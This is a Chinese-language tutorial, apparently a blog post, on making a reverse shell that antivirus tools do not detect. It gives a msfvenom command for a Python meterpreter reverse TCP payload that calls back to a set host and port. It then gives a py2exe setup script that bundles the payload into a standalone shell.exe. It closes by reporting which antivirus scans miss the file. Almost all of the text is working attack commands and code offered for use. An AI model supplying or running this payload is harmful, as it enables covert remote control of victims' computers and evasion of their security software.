免杀一直以来是一个永恒的话题。我们生成的shell无时无刻要和安全软件进行较量。之所以知己知彼，百战不殆。本文我们将利用Python来生成免杀的shell。

🌈生成python版本的shell

代码如下：

msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.50.123 LPORT=5555 -f raw -o bbskali.py

🍢配置PY2EXE

  • (1)安装Python 2.7 x86 windows版：

下载地址：https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi 注意:必须使用x86版本Python 2.7。即使Windows是x64的，也要安装32位版本。

  • (2)安装32位Py2exe for python 2.7:

下载地址：https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download

🍝配置python脚本

#! /usr/bin/env python
#encoding:utf-8

from distutils.core import setup
import py2exe

setup(
name = "shell",
description = "Python-based App",
version = "1.0",
console = ["bbskali.py"], #第一步生成的shell的名字
options = {"py2exe":{"bundle_files":1,"packages":"ctypes","includes":"base64,sys,socket,struct,time,code,platform,getpass,shutil",}},
zipfile = None
)

将上面文件保存为dabiaoge.py然后执行下面命令

python ./dabiaoge.py py2exe


将在dist目录下生成一个shell.exe

🍩效果如下

在本地测试了下，电脑管家不报毒。360正常扫没有问题，但是云查杀报毒。相比msf直接生成的shell,利用Python可以很简单的得到免杀。
